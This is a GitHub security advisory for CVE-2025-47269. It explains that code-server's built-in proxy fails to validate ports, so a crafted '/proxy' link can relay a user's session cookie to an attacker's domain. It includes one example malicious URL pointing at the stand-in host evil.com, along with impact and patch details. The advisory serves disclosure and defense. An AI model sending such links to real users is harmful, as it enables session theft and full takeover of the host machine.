# [H] code-server's session cookie can be extracted by having user visit specially crafted proxy URL

## Summary
Severity: High
Advisory: GHSA-p483-wpfp-42cj
CVE: CVE-2025-47269
CWE: CWE-441
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2025-05-09
Source: https://github.com/advisories/GHSA-p483-wpfp-42cj
Type: github-advisory

## Affected
- npm: `code-server` — affected >=0 <4.99.4

## Details
### Summary

A maliciously crafted URL using the `proxy` subpath can result in the attacker gaining access to the session token.

### Details

Failure to properly validate the port for a `proxy` request can result in proxying to an arbitrary domain. The malicious URL `https://<code-server>/proxy/test@evil.com/path` would be proxied to `test@evil.com/path` where the attacker could exfiltrate a user's session token.

### Impact

Any user who runs code-server with the built-in proxy enabled and clicks on maliciously crafted links that go to their code-server instances with reference to `/proxy`.

Normally this is used to proxy local ports, however the URL can reference the attacker's domain instead, and the connection is then proxied to that domain, which will include sending cookies.

With access to the session cookie, the attacker can then log into code-server and have full access to the machine hosting code-server as the user running code-server.

### Patches

Patched versions are from [v4.99.4](https://github.com/coder/code-server/releases/tag/v4.99.4) onward.

## References
- https://github.com/coder/code-server/security/advisories/GHSA-p483-wpfp-42cj
- https://nvd.nist.gov/vuln/detail/CVE-2025-47269
- https://github.com/coder/code-server/commit/47d6d3ada5aadef6d221f3d612401eb3dad9299e
- https://github.com/coder/code-server
- https://github.com/coder/code-server/releases/tag/v4.99.4
